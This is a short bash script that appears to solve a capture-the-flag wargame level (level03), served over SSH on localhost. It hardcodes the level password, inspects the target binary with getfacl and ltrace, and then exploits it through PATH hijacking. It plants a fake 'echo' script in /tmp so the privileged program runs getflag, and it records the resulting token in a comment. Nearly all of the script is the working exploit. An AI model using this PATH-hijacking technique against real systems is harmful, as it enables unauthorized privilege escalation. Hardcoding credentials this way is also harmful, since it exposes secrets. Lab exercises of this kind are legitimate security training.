#!/bin/bash

ssh() {
    sshpass -p 'kooda2puivaav1idi4f57q8iq' ssh level03@localhost -p 2220 "$1"  
}

ssh "ls -la"

ssh "getfacl ./level03"

ssh "ltrace ./level03"

ssh "./level03 hello"

ssh 'echo $PATH'

ssh 'printf "#!/bin/sh\ngetflag\n" > /tmp/echo && chmod +x /tmp/echo && PATH=/tmp:$PATH ./level03'

#Check flag.Here is your token : qi0maab88jeaj46qoumi7maus